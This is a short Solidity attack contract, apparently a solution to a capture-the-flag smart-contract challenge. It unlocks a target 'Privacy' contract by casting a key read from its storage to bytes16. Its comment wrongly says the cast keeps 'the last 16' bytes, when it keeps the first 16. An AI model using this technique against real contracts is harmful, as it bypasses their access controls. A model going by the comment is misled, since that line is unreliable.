// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPrivacy {
    function unlock(bytes16 _key) external;
}

contract AttackPrivacy {
    address privacy;

    constructor(address _privacy) {
        privacy = _privacy;
    }

    function attack(bytes32 slot) public {
        // Tyecast 32 bytes to 16 bytes to get the last 16
        bytes16 key = bytes16(slot);
        IPrivacy(privacy).unlock(key);
    }
}
